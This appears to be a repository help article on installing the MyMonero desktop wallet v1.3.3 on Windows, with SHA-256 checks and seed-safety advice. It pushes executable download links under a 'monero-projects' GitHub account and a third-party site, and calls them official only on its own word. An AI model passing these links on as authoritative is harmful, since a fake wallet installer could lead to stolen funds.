<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">Install MyMonero on Windows</h1>
<p align="center">Get the final desktop release from the official project page and check the file before opening it.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
The final MyMonero desktop release is v1.3.3, distributed for Windows as an .exe on the project's GitHub release page. Download only from that source, compare the file's SHA-256 value with the release page, and never enter your seed into an installer or website.


The MyMonero.info site covers this in its [MyMonero desktop wallet guide](https://mymonero.info/desktop-wallet). Before installing anything, use the [MyMonero download page](https://mymonero.info/github/monero-projects), and read [MyMonero safety facts](https://mymonero.info/is-mymonero-safe) if anything feels off.

## You'll see this if
- You need to install MyMonero desktop on a Windows computer.
- You found several download pages and want to avoid a fake installer.
- Windows warns about a downloaded file or the app will not open.
- You are deciding whether to keep using the desktop app or restore elsewhere.

## Why it happens
Software downloads can be copied or modified, so the source and file integrity matter. MyMonero's final desktop release is v1.3.3. Its Windows package is an .exe, and the official release information is on GitHub under the monero-projects account. The old app still opens wallets and sends XMR, but is no longer maintained: there are no new features or security updates. MyMonero hosted servers and web wallet login stopped.

Downloading the desktop app does not restore a wallet by itself. To open an existing wallet, use its appropriate recovery method and keep recovery words private. MyMonero seeds can be 13 words (MyMonero-specific, legacy) or 25 words (standard Monero). If you prefer another option, Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. See [restore a MyMonero wallet](./restore-mymonero-wallet.md) and [MyMonero migration choices](./mymonero-to-cake-wallet-migration.md).

---
## Fix
1. **Use the official release page.** Navigate directly to the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3). Check that the project is monero-projects and that the release is v1.3.3. Avoid ads, unofficial download sites, and links from unsolicited messages.
2. **Select the Windows package.** Choose the .exe asset listed for Windows. Do not download a package for macOS or Linux. If the release page does not display the expected file, pause and recheck the project and release information rather than using a third-party mirror.
3. **Keep the download in a known location.** Note which file you downloaded so you can check its integrity. Do not run a file from a message attachment or an unexpected archive. A filename alone does not prove authenticity.
4. **Compare SHA-256 integrity.** The release page provides the published checksum value. On Windows, open Command Prompt and run `certutil -hashfile <file> SHA256`, replacing `<file>` with the path to the downloaded file. Compare the resulting SHA-256 value exactly with the value shown for that same asset on the release page. Do not rely on a checksum copied from an unrelated page.
5. **Stop if the values differ.** A mismatch means the downloaded file does not match the published value. Do not open it; remove it and obtain a fresh copy from the official release page, then compare again. This check is an integrity comparison, not a claim that the app receives ongoing maintenance.
6. **Run the installer you verified.** Open the downloaded .exe only after the source and checksum match. Follow the installer prompts and review any system dialog carefully. If Windows presents a warning you do not understand, stop and investigate instead of bypassing it automatically.
7. **Open the desktop wallet.** Launch MyMonero from the installed application. If you already have a wallet, select its appropriate open or restore option. Use your seed only within trusted wallet software on your device; nobody legitimate should ask you to send it to them.
8. **Restore the matching seed format if needed.** Use the compatible route for a 13-word MyMonero-specific legacy seed or a 25-word standard Monero seed. Inspect your private backup for spelling and order, but do not post any words. For more help see [MyMonero seed not accepted](./mymonero-seed-not-accepted.md).
9. **Allow the wallet to scan.** After recovery, give it time to scan the relevant activity. Restore height is the block height where scanning starts; earlier is safer when uncertain, but slower. Details are in [MyMonero restore height explained](./mymonero-restore-height-explained.md).

> [!WARNING]
> Never type your seed into a download page, support chat, or installer form. A legitimate installer does not need your recovery words.

---
## If that did not work
If the checksum does not match, do not run the file. Revisit the project release page and verify you compared the right asset's complete SHA-256 result. Do not post a checksum together with sensitive wallet information or substitute a value from an unofficial source. For app behavior, review the MyMonero desktop repository.

If the verified app opens but shows no wallet, the installation may be fine while wallet recovery is still needed. Confirm the seed format, wallet identity, and restore height. A zero balance can reflect an incomplete scan; read MyMonero balance shows zero. The hosted web wallet login stopped, so do not follow a page claiming to restore it online.

The desktop app is a final, unmaintained release. It still opens wallets and sends XMR but does not receive new features or security updates. You may continue using it or restore in Cake Wallet, available for iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Never disclose your seed while comparing options.

## Prevention
- Bookmark or type the official project release address rather than trusting ads or messages.
- Check the project name, release version, package type, and published SHA-256 value.
- Keep the verified installer and your wallet seed separate; the installer never needs the seed.
- Store recovery words offline and privately, with their original order and format recorded.
- Remember the desktop app is no longer maintained and has no new security updates.
- Avoid supposed MyMonero web login pages and unsolicited help offers.

## FAQ
<details><summary>What is the final MyMonero desktop version?</summary>

The final desktop release is v1.3.3. Its Windows package is an .exe, and release information is on the project's GitHub page.

</details>

<details><summary>How do I check the Windows download?</summary>

Use `certutil -hashfile <file> SHA256` and compare the output with the SHA-256 value for that asset on the release page. Do not run a file with a mismatch.

</details>

<details><summary>Does installing the app recover my funds automatically?</summary>

No. Installation and wallet restoration are separate. Use the matching seed recovery method within trusted wallet software and keep the seed private.

</details>

<details><summary>Is the desktop app still maintained?</summary>

No. It still opens wallets and sends XMR, but it receives no new features or security updates. MyMonero hosted servers and web wallet login stopped.

</details>

---

## Download MyMonero

- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Install MyMonero on macOS](./install-mymonero-macos.md) | Download the final desktop release from GitHub, verify its SHA-256 value, and open it safely. |
| [Install MyMonero on Linux](./install-mymonero-linux.md) | Get the final Linux desktop release and open it with care. |
| [Verify a MyMonero Download with SHA-256](./verify-mymonero-download-sha256.md) | Compare the file you downloaded with the release page before opening it. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
